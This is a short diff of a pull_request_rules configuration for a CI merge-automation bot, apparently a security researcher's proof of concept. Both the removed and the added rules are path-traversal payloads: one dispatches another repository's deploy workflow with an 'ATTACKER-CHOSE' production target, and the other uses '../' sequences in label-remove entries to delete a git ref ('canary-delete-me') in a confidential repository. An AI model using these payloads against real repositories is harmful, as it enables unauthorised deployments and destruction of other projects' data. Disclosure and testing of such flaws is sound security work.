@@ -1,13 +1,11 @@
 pull_request_rules:
-  - name: attacker-controls-inputs
+  - name: label-remove-traversal
     conditions:
       - base=main
-      - label=pwn-inputs
+      - label=fire-label
     actions:
-      github_actions:
-        workflow:
-          dispatch:
-            - workflow: "../../../../kirasec-research1/ci-confidential-30019349/actions/workflows/deploy-probe.yml"
-              ref: main
-              inputs:
-                target: "ATTACKER-CHOSE-production-us-east-1"
+      label:
+        remove:
+          - "../../../../../kirasec-research1/ci-confidential-30019349/git/refs/heads/canary-delete-me"
+          - "../../../../kirasec-research1/ci-confidential-30019349/git/refs/heads/canary-delete-me"
+          - "../../../kirasec-research1/ci-confidential-30019349/git/refs/heads/canary-delete-me"
